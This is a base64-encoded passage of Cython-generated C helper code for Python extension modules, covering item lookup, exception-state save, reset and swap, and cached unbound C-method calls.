QobykpIHsKICAgICAgICBQeV9zc2l6ZV90IG4gPSAoKCF3cmFwYXJvdW5kKSB8IGxpa2VseShpID49IDApKSA/IGkgOiBpICsgUHlUdXBsZV9HRVRfU0laRShvKTsKICAgICAgICBpZiAoKCFib3VuZHNjaGVjaykgfHwgbGlrZWx5KF9fUHl4X2lzX3ZhbGlkX2luZGV4KG4sIFB5VHVwbGVfR0VUX1NJWkUobykpKSkgewogICAgICAgICAgICBQeU9iamVjdCAqciA9IFB5VHVwbGVfR0VUX0lURU0obywgbik7CiAgICAgICAgICAgIFB5X0lOQ1JFRihyKTsKICAgICAgICAgICAgcmV0dXJuIHI7CiAgICAgICAgfQogICAgfSBlbHNlIHsKICAgICAgICBQeU1hcHBpbmdNZXRob2RzICptbSA9IFB5X1RZUEUobyktPnRwX2FzX21hcHBpbmc7CiAgICAgICAgUHlTZXF1ZW5jZU1ldGhvZHMgKnNtID0gUHlfVFlQRShvKS0+dHBfYXNfc2VxdWVuY2U7CiAgICAgICAgaWYgKG1tICYmIG1tLT5tcF9zdWJzY3JpcHQpIHsKICAgICAgICAgICAgUHlPYmplY3QgKnIsICprZXkgPSBQeUxvbmdfRnJvbVNzaXplX3QoaSk7CiAgICAgICAgICAgIGlmICh1bmxpa2VseSgha2V5KSkgcmV0dXJuIE5VTEw7CiAgICAgICAgICAgIHIgPSBtbS0+bXBfc3Vic2NyaXB0KG8sIGtleSk7CiAgICAgICAgICAgIFB5X0RFQ1JFRihrZXkpOwogICAgICAgICAgICByZXR1cm4gcjsKICAgICAgICB9CiAgICAgICAgaWYgKGxpa2VseShzbSAmJiBzbS0+c3FfaXRlbSkpIHsKICAgICAgICAgICAgaWYgKHdyYXBhcm91bmQgJiYgdW5saWtlbHkoaSA8IDApICYmIGxpa2VseShzbS0+c3FfbGVuZ3RoKSkgewogICAgICAgICAgICAgICAgUHlfc3NpemVfdCBsID0gc20tPnNxX2xlbmd0aChvKTsKICAgICAgICAgICAgICAgIGlmIChsaWtlbHkobCA+PSAwKSkgewogICAgICAgICAgICAgICAgICAgIGkgKz0gbDsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKCFQeUVycl9FeGNlcHRpb25NYXRjaGVzKFB5RXhjX092ZXJmbG93RXJyb3IpKQogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gTlVMTDsKICAgICAgICAgICAgICAgICAgICBQeUVycl9DbGVhcigpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiBzbS0+c3FfaXRlbShvLCBpKTsKICAgICAgICB9CiAgICB9CiNlbHNlCiAgICBpZiAoaXNfbGlzdCB8fCAhUHlNYXBwaW5nX0NoZWNrKG8pKSB7CiAgICAgICAgcmV0dXJuIFB5U2VxdWVuY2VfR2V0SXRlbShvLCBpKTsKICAgIH0KI2VuZGlmCiAgICByZXR1cm4gX19QeXhfR2V0SXRlbUludF9HZW5lcmljKG8sIFB5TG9uZ19Gcm9tU3NpemVfdChpKSk7Cn0KCgojaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fUFlQWQpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X1B5RGljdF9HZXRJdGVtKFB5T2JqZWN0ICpkLCBQeU9iamVjdCoga2V5KSB7CiAgICBQeU9iamVjdCAqdmFsdWU7CiAgICBpZiAodW5saWtlbHkoX19QeXhfUHlEaWN0X0dldEl0ZW1SZWYoZCwga2V5LCAmdmFsdWUpID09IDApKSB7IC8vIG5vIHZhbHVlLCBubyBlcnJvcgogICAgICAgIGlmICh1bmxpa2VseShQeVR1cGxlX0NoZWNrKGtleSkpKSB7CiAgICAgICAgICAgIFB5T2JqZWN0KiBhcmdzID0gUHlUdXBsZV9QYWNrKDEsIGtleSk7CiAgICAgICAgICAgIGlmIChsaWtlbHkoYXJncykpIHsKICAgICAgICAgICAgICAgIFB5RXJyX1NldE9iamVjdChQeUV4Y19LZXlFcnJvciwgYXJncyk7CiAgICAgICAgICAgICAgICBQeV9ERUNSRUYoYXJncyk7CiAgICAgICAgICAgIH0KICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBQeUVycl9TZXRPYmplY3QoUHlFeGNfS2V5RXJyb3IsIGtleSk7CiAgICAgICAgfQogICAgfQogICAgcmV0dXJuIHZhbHVlOwp9CiNlbmRpZgoKCiNpZiBDWVRIT05fVVNFX1BZVFlQRV9MT09LVVAgJiYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9fUHlPYmplY3RfTG9va3VwU3BlY2lhbChQeU9iamVjdCogb2JqLCBQeU9iamVjdCogYXR0cl9uYW1lLCBpbnQgd2l0aF9lcnJvcikgewogICAgUHlPYmplY3QgKnJlczsKICAgIFB5VHlwZU9iamVjdCAqdHAgPSBQeV9UWVBFKG9iaik7CiAgICByZXMgPSBfUHlUeXBlX0xvb2t1cCh0cCwgYXR0cl9uYW1lKTsKICAgIGlmIChsaWtlbHkocmVzKSkgewogICAgICAgIGRlc2NyZ2V0ZnVuYyBmID0gUHlfVFlQRShyZXMpLT50cF9kZXNjcl9nZXQ7CiAgICAgICAgaWYgKCFmKSB7CiAgICAgICAgICAgIFB5X0lOQ1JFRihyZXMpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHJlcyA9IGYocmVzLCBvYmosIChQeU9iamVjdCAqKXRwKTsKICAgICAgICB9CiAgICB9IGVsc2UgaWYgKHdpdGhfZXJyb3IpIHsKICAgICAgICBQeUVycl9TZXRPYmplY3QoUHlFeGNfQXR0cmlidXRlRXJyb3IsIGF0dHJfbmFtZSk7CiAgICB9CiAgICByZXR1cm4gcmVzOwp9CiNlbmRpZgoKCiNpZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLICYmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURQpzdGF0aWMgX1B5RXJyX1N0YWNrSXRlbSAqCl9fUHl4X1B5RXJyX0dldFRvcG1vc3RFeGNlcHRpb24oUHlUaHJlYWRTdGF0ZSAqdHN0YXRlKQp7CiAgICBfUHlFcnJfU3RhY2tJdGVtICpleGNfaW5mbyA9IHRzdGF0ZS0+ZXhjX2luZm87CiAgICB3aGlsZSAoKGV4Y19pbmZvLT5leGNfdmFsdWUgPT0gTlVMTCB8fCBleGNfaW5mby0+ZXhjX3ZhbHVlID09IFB5X05vbmUpICYmCiAgICAgICAgICAgZXhjX2luZm8tPnByZXZpb3VzX2l0ZW0gIT0gTlVMTCkKICAgIHsKICAgICAgICBleGNfaW5mbyA9IGV4Y19pbmZvLT5wcmV2aW91c19pdGVtOwogICAgfQogICAgcmV0dXJuIGV4Y19pbmZvOwp9CiNlbmRpZgoKCiNpZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEUKc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9fRXhjZXB0aW9uU2F2ZShQeVRocmVhZFN0YXRlICp0c3RhdGUsIFB5T2JqZWN0ICoqdHlwZSwgUHlPYmplY3QgKip2YWx1ZSwgUHlPYmplY3QgKip0YikgewogICNpZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQjAwYTQKICAgIF9QeUVycl9TdGFja0l0ZW0gKmV4Y19pbmZvID0gX19QeXhfUHlFcnJfR2V0VG9wbW9zdEV4Y2VwdGlvbih0c3RhdGUpOwogICAgUHlPYmplY3QgKmV4Y192YWx1ZSA9IGV4Y19pbmZvLT5leGNfdmFsdWU7CiAgICBpZiAoZXhjX3ZhbHVlID09IE5VTEwgfHwgZXhjX3ZhbHVlID09IFB5X05vbmUpIHsKICAgICAgICAqdmFsdWUgPSBOVUxMOwogICAgICAgICp0eXBlID0gTlVMTDsKICAgICAgICAqdGIgPSBOVUxMOwogICAgfSBlbHNlIHsKICAgICAgICAqdmFsdWUgPSBleGNfdmFsdWU7CiAgICAgICAgUHlfSU5DUkVGKCp2YWx1ZSk7CiAgICAgICAgKnR5cGUgPSAoUHlPYmplY3QqKSBQeV9UWVBFKGV4Y192YWx1ZSk7CiAgICAgICAgUHlfSU5DUkVGKCp0eXBlKTsKICAgICAgICAqdGIgPSBQeUV4Y2VwdGlvbl9HZXRUcmFjZWJhY2soZXhjX3ZhbHVlKTsKICAgIH0KICAjZWxpZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLCiAgICBfUHlFcnJfU3RhY2tJdGVtICpleGNfaW5mbyA9IF9fUHl4X1B5RXJyX0dldFRvcG1vc3RFeGNlcHRpb24odHN0YXRlKTsKICAgICp0eXBlID0gZXhjX2luZm8tPmV4Y190eXBlOwogICAgKnZhbHVlID0gZXhjX2luZm8tPmV4Y192YWx1ZTsKICAgICp0YiA9IGV4Y19pbmZvLT5leGNfdHJhY2ViYWNrOwogICAgUHlfWElOQ1JFRigqdHlwZSk7CiAgICBQeV9YSU5DUkVGKCp2YWx1ZSk7CiAgICBQeV9YSU5DUkVGKCp0Yik7CiAgI2Vsc2UKICAgICp0eXBlID0gdHN0YXRlLT5leGNfdHlwZTsKICAgICp2YWx1ZSA9IHRzdGF0ZS0+ZXhjX3ZhbHVlOwogICAgKnRiID0gdHN0YXRlLT5leGNfdHJhY2ViYWNrOwogICAgUHlfWElOQ1JFRigqdHlwZSk7CiAgICBQeV9YSU5DUkVGKCp2YWx1ZSk7CiAgICBQeV9YSU5DUkVGKCp0Yik7CiAgI2VuZGlmCn0Kc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9fRXhjZXB0aW9uUmVzZXQoUHlUaHJlYWRTdGF0ZSAqdHN0YXRlLCBQeU9iamVjdCAqdHlwZSwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqdGIpIHsKICAjaWYgQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDSyAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEIwMGE0CiAgICBfUHlFcnJfU3RhY2tJdGVtICpleGNfaW5mbyA9IHRzdGF0ZS0+ZXhjX2luZm87CiAgICBQeU9iamVjdCAqdG1wX3ZhbHVlID0gZXhjX2luZm8tPmV4Y192YWx1ZTsKICAgIGV4Y19pbmZvLT5leGNfdmFsdWUgPSB2YWx1ZTsKICAgIFB5X1hERUNSRUYodG1wX3ZhbHVlKTsKICAgIFB5X1hERUNSRUYodHlwZSk7CiAgICBQeV9YREVDUkVGKHRiKTsKICAjZWxzZQogICAgUHlPYmplY3QgKnRtcF90eXBlLCAqdG1wX3ZhbHVlLCAqdG1wX3RiOwogICAgI2lmIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0sKICAgIF9QeUVycl9TdGFja0l0ZW0gKmV4Y19pbmZvID0gdHN0YXRlLT5leGNfaW5mbzsKICAgIHRtcF90eXBlID0gZXhjX2luZm8tPmV4Y190eXBlOwogICAgdG1wX3ZhbHVlID0gZXhjX2luZm8tPmV4Y192YWx1ZTsKICAgIHRtcF90YiA9IGV4Y19pbmZvLT5leGNfdHJhY2ViYWNrOwogICAgZXhjX2luZm8tPmV4Y190eXBlID0gdHlwZTsKICAgIGV4Y19pbmZvLT5leGNfdmFsdWUgPSB2YWx1ZTsKICAgIGV4Y19pbmZvLT5leGNfdHJhY2ViYWNrID0gdGI7CiAgICAjZWxzZQogICAgdG1wX3R5cGUgPSB0c3RhdGUtPmV4Y190eXBlOwogICAgdG1wX3ZhbHVlID0gdHN0YXRlLT5leGNfdmFsdWU7CiAgICB0bXBfdGIgPSB0c3RhdGUtPmV4Y190cmFjZWJhY2s7CiAgICB0c3RhdGUtPmV4Y190eXBlID0gdHlwZTsKICAgIHRzdGF0ZS0+ZXhjX3ZhbHVlID0gdmFsdWU7CiAgICB0c3RhdGUtPmV4Y190cmFjZWJhY2sgPSB0YjsKICAgICNlbmRpZgogICAgUHlfWERFQ1JFRih0bXBfdHlwZSk7CiAgICBQeV9YREVDUkVGKHRtcF92YWx1ZSk7CiAgICBQeV9YREVDUkVGKHRtcF90Yik7CiAgI2VuZGlmCn0KI2VuZGlmCgoKI2lmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURQpzdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X19FeGNlcHRpb25Td2FwKFB5VGhyZWFkU3RhdGUgKnRzdGF0ZSwgUHlPYmplY3QgKip0eXBlLCBQeU9iamVjdCAqKnZhbHVlLCBQeU9iamVjdCAqKnRiKSB7CiAgICBQeU9iamVjdCAqdG1wX3R5cGUsICp0bXBfdmFsdWUsICp0bXBfdGI7CiAgI2lmIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0sgJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBCMDBhNAogICAgX1B5RXJyX1N0YWNrSXRlbSAqZXhjX2luZm8gPSB0c3RhdGUtPmV4Y19pbmZvOwogICAgdG1wX3ZhbHVlID0gZXhjX2luZm8tPmV4Y192YWx1ZTsKICAgIGV4Y19pbmZvLT5leGNfdmFsdWUgPSAqdmFsdWU7CiAgICBpZiAodG1wX3ZhbHVlID09IE5VTEwgfHwgdG1wX3ZhbHVlID09IFB5X05vbmUpIHsKICAgICAgICBQeV9YREVDUkVGKHRtcF92YWx1ZSk7CiAgICAgICAgdG1wX3ZhbHVlID0gTlVMTDsKICAgICAgICB0bXBfdHlwZSA9IE5VTEw7CiAgICAgICAgdG1wX3RiID0gTlVMTDsKICAgIH0gZWxzZSB7CiAgICAgICAgdG1wX3R5cGUgPSAoUHlPYmplY3QqKSBQeV9UWVBFKHRtcF92YWx1ZSk7CiAgICAgICAgUHlfSU5DUkVGKHRtcF90eXBlKTsKICAgICAgICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OCiAgICAgICAgdG1wX3RiID0gKChQeUJhc2VFeGNlcHRpb25PYmplY3QqKSB0bXBfdmFsdWUpLT50cmFjZWJhY2s7CiAgICAgICAgUHlfWElOQ1JFRih0bXBfdGIpOwogICAgICAgICNlbHNlCiAgICAgICAgdG1wX3RiID0gUHlFeGNlcHRpb25fR2V0VHJhY2ViYWNrKHRtcF92YWx1ZSk7CiAgICAgICAgI2VuZGlmCiAgICB9CiAgI2VsaWYgQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDSwogICAgX1B5RXJyX1N0YWNrSXRlbSAqZXhjX2luZm8gPSB0c3RhdGUtPmV4Y19pbmZvOwogICAgdG1wX3R5cGUgPSBleGNfaW5mby0+ZXhjX3R5cGU7CiAgICB0bXBfdmFsdWUgPSBleGNfaW5mby0+ZXhjX3ZhbHVlOwogICAgdG1wX3RiID0gZXhjX2luZm8tPmV4Y190cmFjZWJhY2s7CiAgICBleGNfaW5mby0+ZXhjX3R5cGUgPSAqdHlwZTsKICAgIGV4Y19pbmZvLT5leGNfdmFsdWUgPSAqdmFsdWU7CiAgICBleGNfaW5mby0+ZXhjX3RyYWNlYmFjayA9ICp0YjsKICAjZWxzZQogICAgdG1wX3R5cGUgPSB0c3RhdGUtPmV4Y190eXBlOwogICAgdG1wX3ZhbHVlID0gdHN0YXRlLT5leGNfdmFsdWU7CiAgICB0bXBfdGIgPSB0c3RhdGUtPmV4Y190cmFjZWJhY2s7CiAgICB0c3RhdGUtPmV4Y190eXBlID0gKnR5cGU7CiAgICB0c3RhdGUtPmV4Y192YWx1ZSA9ICp2YWx1ZTsKICAgIHRzdGF0ZS0+ZXhjX3RyYWNlYmFjayA9ICp0YjsKICAjZW5kaWYKICAgICp0eXBlID0gdG1wX3R5cGU7CiAgICAqdmFsdWUgPSB0bXBfdmFsdWU7CiAgICAqdGIgPSB0bXBfdGI7Cn0KI2Vsc2UKc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9FeGNlcHRpb25Td2FwKFB5T2JqZWN0ICoqdHlwZSwgUHlPYmplY3QgKip2YWx1ZSwgUHlPYmplY3QgKip0YikgewogICAgUHlPYmplY3QgKnRtcF90eXBlLCAqdG1wX3ZhbHVlLCAqdG1wX3RiOwogICAgUHlFcnJfR2V0RXhjSW5mbygmdG1wX3R5cGUsICZ0bXBfdmFsdWUsICZ0bXBfdGIpOwogICAgUHlFcnJfU2V0RXhjSW5mbygqdHlwZSwgKnZhbHVlLCAqdGIpOwogICAgKnR5cGUgPSB0bXBfdHlwZTsKICAgICp2YWx1ZSA9IHRtcF92YWx1ZTsKICAgICp0YiA9IHRtcF90YjsKfQojZW5kaWYKCgpzdGF0aWMgdm9pZCBfX1B5eF9SYWlzZURvdWJsZUtleXdvcmRzRXJyb3IoCiAgICBjb25zdCBjaGFyKiBmdW5jX25hbWUsCiAgICBQeU9iamVjdCoga3dfbmFtZSkKewogICAgUHlFcnJfRm9ybWF0KFB5RXhjX1R5cGVFcnJvciwKICAgICAgICAiJXMoKSBnb3QgbXVsdGlwbGUgdmFsdWVzIGZvciBrZXl3b3JkIGFyZ3VtZW50ICclVSciLCBmdW5jX25hbWUsIGt3X25hbWUpOwp9CgoKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA8IDB4MDMwQzAwMDAKc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9TZWxmbGVzc0NhbGwoUHlPYmplY3QgKm1ldGhvZCwgUHlPYmplY3QgKmFyZ3MsIFB5T2JqZWN0ICprd2FyZ3MpIHsKICAgIFB5T2JqZWN0ICpyZXN1bHQ7CiAgICBQeU9iamVjdCAqc2VsZmxlc3NfYXJncyA9IFB5VHVwbGVfR2V0U2xpY2UoYXJncywgMSwgUHlUdXBsZV9TaXplKGFyZ3MpKTsKICAgIGlmICh1bmxpa2VseSghc2VsZmxlc3NfYXJncykpIHJldHVybiBOVUxMOwogICAgcmVzdWx0ID0gUHlPYmplY3RfQ2FsbChtZXRob2QsIHNlbGZsZXNzX2FyZ3MsIGt3YXJncyk7CiAgICBQeV9ERUNSRUYoc2VsZmxlc3NfYXJncyk7CiAgICByZXR1cm4gcmVzdWx0Owp9CiNlbGlmIENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSAmJiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwOTAwMDAKc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9TZWxmbGVzc0NhbGwoUHlPYmplY3QgKm1ldGhvZCwgUHlPYmplY3QgKiphcmdzLCBQeV9zc2l6ZV90IG5hcmdzLCBQeU9iamVjdCAqa3duYW1lcykgewogICAgICAgIHJldHVybiBfUHlPYmplY3RfVmVjdG9yY2FsbAogICAgICAgICAgICAobWV0aG9kLCBhcmdzID8gYXJncysxIDogTlVMTCwgbmFyZ3MgPyBuYXJncy0xIDogMCwga3duYW1lcyk7Cn0KI2Vsc2UKc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9TZWxmbGVzc0NhbGwoUHlPYmplY3QgKm1ldGhvZCwgUHlPYmplY3QgKmNvbnN0ICphcmdzLCBQeV9zc2l6ZV90IG5hcmdzLCBQeU9iamVjdCAqa3duYW1lcykgewogICAgcmV0dXJuCiNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwOTAwMDAKICAgIF9QeU9iamVjdF9WZWN0b3JjYWxsCiNlbHNlCiAgICBQeU9iamVjdF9WZWN0b3JjYWxsCiNlbmRpZgogICAgICAgIChtZXRob2QsIGFyZ3MgPyBhcmdzKzEgOiBOVUxMLCBuYXJncyA/IChzaXplX3QpIG5hcmdzLTEgOiAwLCBrd25hbWVzKTsKfQojZW5kaWYKc3RhdGljIFB5TWV0aG9kRGVmIF9fUHl4X1VuYm91bmRDTWV0aG9kX0RlZiA9IHsKICAgICAiQ3l0aG9uVW5ib3VuZENNZXRob2QiLAogICAgIF9fUFlYX1JFSU5URVJQUkVUX0ZVTkNJT04oUHlDRnVuY3Rpb24sIF9fUHl4X1NlbGZsZXNzQ2FsbCksCiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPCAweDAzMEMwMDAwCiAgICAgTUVUSF9WQVJBUkdTIHwgTUVUSF9LRVlXT1JEUywKI2Vsc2UKICAgICBNRVRIX0ZBU1RDQUxMIHwgTUVUSF9LRVlXT1JEUywKI2VuZGlmCiAgICAgTlVMTAp9OwpzdGF0aWMgaW50IF9fUHl4X1RyeVVucGFja1VuYm91bmRDTWV0aG9kKF9fUHl4X0NhY2hlZENGdW5jdGlvbiogdGFyZ2V0KSB7CiAgICBQeU9iamVjdCAqbWV0aG9kLCAqcmVzdWx0PU5VTEw7CiAgICBtZXRob2QgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKHRhcmdldC0+dHlwZSwgKnRhcmdldC0+bWV0aG9kX25hbWUpOwogICAgaWYgKHVubGlrZWx5KCFtZXRob2QpKQogICAgICAgIHJldHVybiAtMTsKICAgIHJlc3VsdCA9IG1ldGhvZDsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTgogICAgaWYgKGxpa2VseShfX1B5eF9UeXBlQ2hlY2sobWV0aG9kLCAmUHlNZXRob2REZXNjcl9UeXBlKSkpCiAgICB7CiAgICAgICAgUHlNZXRob2REZXNjck9iamVjdCAqZGVzY3IgPSAoUHlNZXRob2REZXNjck9iamVjdCopIG1ldGhvZDsKICAgICAgICB0YXJnZXQtPmZ1bmMgPSBkZXNjci0+ZF9tZXRob2QtPm1sX21ldGg7CiAgICAgICAgdGFyZ2V0LT5mbGFnID0gZGVzY3ItPmRfbWV0aG9kLT5tbF9mbGFncyAmIH4oTUVUSF9DTEFTUyB8IE1FVEhfU1RBVElDIHwgTUVUSF9DT0VYSVNUIHwgTUVUSF9TVEFDS0xFU1MpOwogICAgfSBlbHNlCiNlbmRpZgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZCiNlbHNlCiAgICBpZiAoUHlDRnVuY3Rpb25fQ2hlY2sobWV0aG9kKSkKI2VuZGlmCiAgICB7CiAgICAgICAgUHlPYmplY3QgKnNlbGY7CiAgICAgICAgaW50IHNlbGZfZm91bmQ7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWQogICAgICAgIHNlbGYgPSBQeU9iamVjdF9HZXRBdHRyU3RyaW5nKG1ldGhvZCwgIl9fc2VsZl9fIik7CiAgICAgICAgaWYgKCFzZWxmKSB7CiAgICAgICAgICAgIFB5RXJyX0NsZWFyKCk7CiAgICAgICAgfQojZWxzZQogICAgICAgIHNlbGYgPSBQeUNGdW5jdGlvbl9HRVRfU0VMRihtZXRob2QpOwojZW5kaWYKICAgICAgICBzZWxmX2ZvdW5kID0gKHNlbGYgJiYgc2VsZiAhPSBQeV9Ob25lKTsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZCiAgICAgICAgUHlfWERFQ1JFRihzZWxmKTsKI2VuZGlmCiAgICAgICAgaWYgKHNlbGZfZm91bmQpIHsKICAgICAgICAgICAgUHlPYmplY3QgKnVuYm91bmRfbWV0aG9kID0gUHlDRnVuY3Rpb25fTmV3KCZfX1B5eF9VbmJvdW5kQ01ldGhvZF9EZWYsIG1ldGhvZCk7CiAgICAgICAgICAgIGlmICh1bmxpa2VseSghdW5ib3VuZF9tZXRob2QpKSByZXR1cm4gLTE7CiAgICAgICAgICAgIFB5X0RFQ1JFRihtZXRob2QpOwogICAgICAgICAgICByZXN1bHQgPSB1bmJvdW5kX21ldGhvZDsKICAgICAgICB9CiAgICB9CiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkcKICAgIGlmICh1bmxpa2VseSh0YXJnZXQtPm1ldGhvZCkpIHsKICAgICAgICBQeV9ERUNSRUYocmVzdWx0KTsKICAgIH0gZWxzZQojZW5kaWYKICAgIHRhcmdldC0+bWV0aG9kID0gcmVzdWx0OwogICAgcmV0dXJuIDA7Cn0KCgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9DYWxsVW5ib3VuZENNZXRob2QyKF9fUHl4X0NhY2hlZENGdW5jdGlvbiAqY2Z1bmMsIFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqYXJnMSwgUHlPYmplY3QgKmFyZzIpIHsKICAgIGludCB3YXNfaW5pdGlhbGl6ZWQgPSBfX1B5eF9DYWNoZWRDRnVuY3Rpb25fR2V0QW5kU2V0SW5pdGlhbGl6aW5nKGNmdW5jKTsKICAgIGlmIChsaWtlbHkod2FzX2luaXRpYWxpemVkID09IDIgJiYgY2Z1bmMtPmZ1bmMpKSB7CiAgICAgICAgUHlPYmplY3QgKmFyZ3NbMl0gPSB7YXJnMSwgYXJnMn07CiAgICAgICAgaWYgKGNmdW5jLT5mbGFnID09IE1FVEhfRkFTVENBTEwpIHsKICAgICAgICAgICAgcmV0dXJuIF9fUHl4X0NhbGxDRnVuY3Rpb25GYXN0KGNmdW5jLCBzZWxmLCBhcmdzLCAyKTsKICAgICAgICB9CiAgICAgICAgaWYgKGNmdW5jLT5mbGFnID09IChNRVRIX0ZBU1RDQUxMIHwgTUVUSF9LRVlXT1JEUykpCiAgICAgICAgICAgIHJldHVybiBfX1B5eF9DYWxsQ0Z1bmN0aW9uRmFzdFdpdGhLZXl3b3JkcyhjZnVuYywgc2VsZiwgYXJncywgMiwgTlVMTCk7CiAgICB9CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElORwogICAgZWxzZSBpZiAodW5saWtlbHkod2FzX2luaXRpYWxpemVkID09IDEpKSB7CiAgICAgICAgX19QeXhfQ2FjaGVkQ0Z1bmN0aW9uIHRtcF9jZnVuYyA9IHsKI2lmbmRlZiBfX2NwbHVzcGx1cwogICAgICAgICAgICAwCiNlbmRpZgogICAgICAgIH07CiAgICAgICAgdG1wX2NmdW5jLnR5cGUgPSBjZnVuYy0+dHlwZTsKICAgICAgICB0bXBfY2Z1bmMubWV0aG9kX25hbWUgPSBjZnVuYy0+bWV0aG9kX25hbWU7CiAgICAgICAgcmV0dXJuIF9fUHl4X19DYWxsVW5ib3VuZENNZXRob2QyKCZ0bXBfY2Z1bmMsIHNlbGYsIGFyZzEsIGFyZzIpOwogICAgfQojZW5kaWYKICAgIFB5T2JqZWN0ICpyZXN1bHQgPSBfX1B5eF9fQ2FsbFVuYm91bmRDTWV0aG9kMihjZnVuYywgc2VsZiwgYXJnMSwgYXJnMik7CiAgICBfX1B5eF9DYWNoZWRDRnVuY3Rpb25fU2V0RmluaXNoZWRJbml0aWFsaXppbmcoY2Z1bmMpOwogICAgcmV0dXJuIHJlc3VsdDsKfQojZW5kaWYKc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9fQ2FsbFVuYm91bmRDTWV0aG9kMihfX1B5eF9DYWNoZWRDRnVuY3Rpb24qIGNmdW5jLCBQeU9iamVjdCogc2VsZiwgUHlPYmplY3QqIGFyZzEsIFB5T2JqZWN0KiBhcmcyKXsKICAgIGlmICh1bmxpa2VseSghY2Z1bmMtPmZ1bmMgJiYgIWNmdW5jLT5tZXRob2QpICYmIHVubGlrZWx5KF9fUHl4X1RyeVVucGFja1VuYm91bmRDTWV0aG9kKGNmdW5jKSA8IDApKSByZXR1cm4gTlVMTDsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTgogICAgaWYgKGNmdW5jLT5mdW5jICYmIChjZnVuYy0+ZmxhZyAmIE1FVEhfVkFSQVJHUykpIHsKICAgICAgICBQeU9iamVjdCAqcmVzdWx0ID0gTlVMTDsKICAgICAgICBQeU9iamVjdCAqYXJncyA9IFB5VHVwbGVfTmV3KDIpOwogICAgICAgIGlmICh1bmxpa2VseSghYXJncykpIHJldHVybiBOVUxMOwogICAgICAgIFB5X0lOQ1JFRihhcmcxKTsKICAgICAgICBQeVR1cGxlX1NFVF9JVEVNKGFyZ3MsIDAsIGFyZzEpOwogICAgICAgIFB5X0lOQ1JFRihhcmcyKTsKICAgICAgICBQeVR1cGxlX1NFVF9JVEVNKGFyZ3MsIDEsIGFyZzIpOwogICAgICAgIGlmIChjZnVuYy0+ZmxhZyAmIE1FVEhfS0VZV09SRFMpCiAgICAgICAgICAgIHJlc3VsdCA9IF9fUHl4X0NhbGxDRnVuY3Rpb25XaXRoS2V5d29yZHMoY2Z1bmMsIHNlbGYsIGFyZ3MsIE5VTEwpOwogICAgICAgIGVsc2UKICAgICAgICAgICAgcmVzdWx0ID0gX19QeXhfQ2FsbENGdW5jdGlvbihjZnVuYywgc2VsZiwgYXJncyk7CiAgICAgICAgUHlfREVDUkVGKGFyZ3MpOwogICAgICAgIHJldHVybiByZXN1bHQ7CiAgICB9CiNlbmRpZgogICAgewogICAgICAgIFB5T2JqZWN0ICphcmdzWzRdID0ge05VTEwsIHNlbGYsIGFyZzEsIGFyZzJ9OwogICAgICAgIHJldHVybiBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChjZnVuYy0+bWV0aG9kLCBhcmdzKzEsIDMgfCBfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpOwogICAgfQp9CgoKc3RhdGljIGludCBfX1B5eF9WYWxpZGF0ZUR1cGxpY2F0ZVBvc0FyZ3MoCiAgICBQeU9iamVjdCAqa3dkcywKI